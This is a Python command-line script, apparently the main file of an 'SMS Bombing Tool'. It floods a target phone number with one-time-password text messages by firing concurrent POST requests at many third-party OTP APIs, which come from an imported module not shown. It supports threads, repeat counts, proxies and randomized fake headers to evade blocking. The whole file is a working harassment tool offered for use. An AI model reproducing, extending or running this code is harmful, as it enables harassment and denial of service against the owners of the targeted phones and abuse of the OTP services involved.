import argparse
import concurrent.futures
import signal
from datetime import datetime
from os import _exit
import requests

from alive_progress import alive_bar
from colorama import Fore, Style
from fake_headers import Headers

from api import send_otp_requests


def parse_arguments():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="SMS Bombing Tool")
    parser.add_argument("target", help="The target phone number")
    parser.add_argument(
        "-c",
        "--count",
        help="Number of times to bomb the target phone number (default is 1)",
        type=int,
        default=1,
    )
    parser.add_argument(
        "-t",
        "--threads",
        help="Number of concurrent threads to use for bombing (default is 5)",
        type=int,
        default=5,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Display additional information during the bombing process",
        action="store_true",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        help="Set a proxy server for requests (http/https)",
    )

    args = parser.parse_args()

    return args.target, args.count, args.threads, args.verbose, args.proxy


def send_request(api_name, api_url, data, timeout, proxy=None):
    """
    Send HTTP request to the specified API.
    """
    headers = Headers()
    generated_headers = headers.generate()
    current_time = datetime.now().strftime("%H:%M:%S")
    response = None

    try:
        response = requests.post(
            api_url,
            headers=generated_headers,
            json=data,
            timeout=timeout,
            proxies=proxy,
        )
        response.raise_for_status()

        return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[Success] {api_name} =>{Style.RESET_ALL} OK"
    except requests.exceptions.RequestException as e:
        error_code = response.status_code if response else "Unknown"
        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[Failed] {api_name} =>{Style.RESET_ALL} Error {error_code}: {e}"


def process_target(api, proxy):
    """
    Process the target API.
    """
    return send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)


def handle_sigint(signal, frame):
    """
    Handle SIGINT signal.
    """
    print(f"\n{Fore.YELLOW}[!] User interrupted the process.{Style.RESET_ALL}")
    _exit(1)


def display_results(futures):
    """
    Print results of the bombing process.
    """
    results = [future.result() for future in futures]
    succeeded = [result for result in results if "OK" in result]
    failed = [result for result in results if "Failed" in result]

    print(
        f"\nSucceeded: {Fore.GREEN}{len(succeeded)}{Style.RESET_ALL}, "
        f"Failed: {Fore.RED}{len(failed)}{Style.RESET_ALL}"
    )


def main():
    """
    Main function to run the SMS bombing tool.
    """
    signal.signal(signal.SIGINT, handle_sigint)
    target, count, threads, verbose, proxy = parse_arguments()
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None

    if proxy:
        print(f"Using proxy: {proxy}")

    apis = send_otp_requests(target)

    with alive_bar(count * len(apis), theme="smooth") as progress_bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(process_target, api, proxy_dict) for api in apis * count
            ]

            for future in concurrent.futures.as_completed(futures):
                progress_bar()
                result = future.result()
                if verbose:
                    if "OK" in result:
                        print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}{result}{Style.RESET_ALL}")

    display_results(futures)


if __name__ == "__main__":
    main()
